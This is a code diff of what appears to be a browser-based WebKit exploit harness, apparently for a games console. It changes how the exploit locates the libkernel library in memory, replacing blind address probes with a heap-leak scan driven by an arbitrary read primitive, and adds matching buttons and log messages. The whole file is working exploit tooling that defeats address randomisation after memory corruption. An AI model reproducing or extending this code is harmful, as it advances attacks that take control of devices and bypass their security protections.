@@ -30,14 +30,15 @@ import {
     scanLibkernelChunk,
     diagnoseWebkitDynamic,
     estimateLibkernelCandidates,
-    probeLibkernelGuesses,
+    showLibkernelGuesses,
+    scanLibkernelLeakChunk,
     verifyManualLibkernelFromPtr,
     isGetpidStub as lkIsGetpidStub,
     verifyManualLibkernel,
 } from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829m";
+const BUILD_ID = "rw-20250829n";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -339,7 +340,8 @@ const MANUAL_TESTS = [
     { id: "elf", group: "base", label: "ELF @ base" },
     { id: "native", group: "base", label: "nativeFn code" },
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
-    { id: "probe-lk", group: "base", label: "Probe guesses" },
+    { id: "leak-lk", group: "base", label: "Leak scan LK" },
+    { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "paste-lk", group: "base", label: "Paste libkernel" },
     { id: "libkernel", group: "base", label: "libkernel" },
     { id: "stub20", group: "base", label: "getpid stub" },
@@ -444,8 +446,12 @@ function runManualTest(testId) {
             });
             return;
         }
-        if (testId === "probe-lk") {
-            runProbeLkGuesses().catch(function (err) {
+        if (testId === "probe-lk" || testId === "show-lk") {
+            runShowLkHints();
+            return;
+        }
+        if (testId === "leak-lk") {
+            runLeakLkScan().catch(function (err) {
                 mark("LK-FAIL", err.message || String(err));
                 busy = false;
                 setUi();
@@ -1693,13 +1699,12 @@ function logLibkernelMissSummary(chunk, scanStateObj, webkitBase, nativeFn) {
     const ff25 = chunk.ff25 != null ? chunk.ff25 : (ps.ff25 || 0);
     const gotHigh = chunk.gotHigh != null ? chunk.gotHigh : (ps.gotHigh || 0);
     const e8ext = chunk.e8ext != null ? chunk.e8ext : (ps.e8ext || 0);
-    const ring = chunk.ringProbes != null ? chunk.ringProbes : (st.ringProbes || 0);
+    const ring = chunk.nearPages != null ? chunk.nearPages : (st.nearPages || 0);
     const leak = chunk.leakTried != null ? chunk.leakTried : (st.leakTried || 0);
-    const guess = chunk.guessTried != null ? chunk.guessTried : 0;
     mark("LK-SUMMARY", "build=" + BUILD_ID + " path=" + path + " phase=" + (chunk.phase || "?")
         + " wk=" + webkitBase
         + " ff25=" + ff25 + " gotHigh=" + gotHigh + " e8ext=" + e8ext
-        + " ring=" + ring + " leak=" + leak + " guess=" + guess
+        + " near=" + ring + " leak=" + leak
         + (chunk.dynTried != null ? " dyn=" + chunk.dynTried : "")
         + (chunk.refs ? " plt=" + chunk.refs : "")
         + (chunk.slots ? " got=" + chunk.slots : "")
@@ -1707,44 +1712,80 @@ function logLibkernelMissSummary(chunk, scanStateObj, webkitBase, nativeFn) {
     const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
     for (let ci = 0; ci < Math.min(cands.length, 6); ci++)
         mark("LK-GUESS", cands[ci].hex + " (" + cands[ci].why + ")");
-    mark("LK-HINT", "tap Probe guesses OR paste LK-GUESS / cal vtable ptr");
+    mark("LK-HINT", "index_cal → vtable ptr → paste here (no blind reads)");
     if (stateEl) {
-        stateEl.textContent = "libkernel miss path=" + path
-            + " ff25=" + ff25 + " ring=" + ring + " — tap Probe guesses";
+        stateEl.textContent = "libkernel miss — open cal, paste vtable ext ptr";
         stateEl.className = "bad";
     }
 }
 
-async function runProbeLkGuesses() {
+async function runShowLkHints() {
+    if (!ready || busy) return;
+    const { nativeFn, webkitBase } = basesFromSession(loadEffectiveOff());
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase — Save bases first");
+        return;
+    }
+    showLibkernelGuesses(webkitBase, nativeFn, mark);
+    mark("LK-HINT", "hints are NOT probed (OOM) — use Leak scan LK or cal paste");
+    renderOut();
+}
+
+let leakScanState = null;
+
+async function runLeakLkScan() {
     if (!ready || !window.p || busy) return;
     const p = window.p;
     const off = loadEffectiveOff();
-    const { nativeFn, webkitBase } = basesFromSession(off);
+    const { webkitBase } = basesFromSession(off);
     if (!webkitBase) {
         mark("LK-SKIP", "no webkitBase — Save bases first");
         return;
     }
     busy = true;
     setUi();
-    mark("LK-PROBE-RUN", "build=" + BUILD_ID + " wk=" + webkitBase + " — 12 guesses, 2 reads each");
+    leakScanState = null;
+    mark("LK-LEAK", "build=" + BUILD_ID + " — heap slots only (textarea/expm1/parseFloat)");
+    scanState("leak scan…");
+    let ticks = 0;
     try {
-        const r = probeLibkernelGuesses(p, webkitBase, nativeFn, mark);
-        if (r.ok) {
-            mark("LK-OK", "probe hit " + r.lk + " (" + r.why + ")");
-            state("libkernel probe OK", "ok");
-        } else {
-            mark("LK-PROBE-DONE", "no prologue hit — check UNREAD lines (OOM?) vs w0/w1");
-            state("probe miss — paste cal vtable ptr", "bad");
+        while (ticks++ < 8000) {
+            const chunk = scanLibkernelLeakChunk(p, webkitBase, off, leakScanState, retained);
+            leakScanState = chunk.state;
+            if (chunk.phase === "leak-start")
+                mark("LK-LEAK", "targets=" + chunk.targets + " slots=0..0x100");
+            else if (chunk.phase === "leak")
+                scanState("leak tried=" + chunk.tried);
+            if (chunk.done && chunk.lk) {
+                mark("LK-OK", chunk.lk + " (" + (chunk.source || "leak") + ")");
+                state("libkernel leak OK", "ok");
+                break;
+            }
+            if (chunk.done) {
+                mark("LK-LEAK-MISS", "tried=" + (chunk.tried || 0)
+                    + " — paste cal vtable ext ptr into hex box");
+                state("leak miss — paste cal ptr", "bad");
+                break;
+            }
+            if ((ticks & 15) === 0)
+                await new Promise(r => setTimeout(r, 2));
+            else
+                await new Promise(r => setTimeout(r, 0));
         }
     } catch (err) {
         mark("LK-FAIL", err.message || String(err));
-        state("probe error", "bad");
+        state("leak scan error", "bad");
     } finally {
         busy = false;
+        leakScanState = null;
         setUi();
         renderOut();
         flushPersistMilestones();
     }
+}
+
+async function runProbeLkGuesses() {
+    return runShowLkHints();
 }
 
 async function runScanIat() {
@@ -1788,7 +1829,7 @@ async function runScanIat() {
             iatScanState = chunk.state;
             if (chunk.phase === "lite-start")
                 mark("LK-LITE", "poops path build=" + BUILD_ID
-                    + " — PLT→nearlk→ring→leak→guess");
+                    + " — PLT→nearlk→leak (no blind reads)");
             else if (chunk.phase === "nearlk-next")
                 mark("LK-NEAR", "PLT miss ff25=" + (chunk.ff25 || 0)
                     + " gotHigh=" + (chunk.gotHigh || 0)
@@ -1799,25 +1840,12 @@ async function runScanIat() {
             else if (chunk.phase === "nearlk" || chunk.phase === "nearlk-anchor")
                 scanState("nearlk a#" + (chunk.anchor || 0) + " @" + chunk.at
                     + " pages=" + chunk.pages + " magic=" + (chunk.hits || 0));
-            else if (chunk.phase === "ring-next")
-                mark("LK-RING", "nearlk miss — prologue ring ±128MB");
-            else if (chunk.phase === "ring-start")
-                mark("LK-RING", "0x4000 steps from anchor, no ELF magic needed");
-            else if (chunk.phase === "ring" || chunk.phase === "ring-anchor")
-                scanState("ring @" + chunk.at + " probes=" + chunk.probes);
             else if (chunk.phase === "leak-next")
-                mark("LK-LEAK", "ring miss probes=" + (chunk.ringProbes || 0)
-                    + " — textarea/expm1 slots");
+                mark("LK-LEAK", "nearlk miss — heap leakval scan (OOM-safe)");
             else if (chunk.phase === "leak-start")
                 mark("LK-LEAK", "scan leakval slots n=" + chunk.targets);
             else if (chunk.phase === "leak")
                 scanState("leak tried=" + chunk.tried);
-            else if (chunk.phase === "guess-next")
-                mark("LK-GUESS", "leak miss — probing ±128MB estimates");
-            else if (chunk.phase === "guess-start")
-                mark("LK-GUESS", "prologue check n=" + chunk.total);
-            else if (chunk.phase === "guess")
-                scanState("guess " + chunk.tried + "/" + chunk.total);
             else if (chunk.phase === "lite-miss")
                 logLibkernelMissSummary(chunk, iatScanState, webkitBase, nativeFn);
             else if (chunk.phase === "dyn-start")
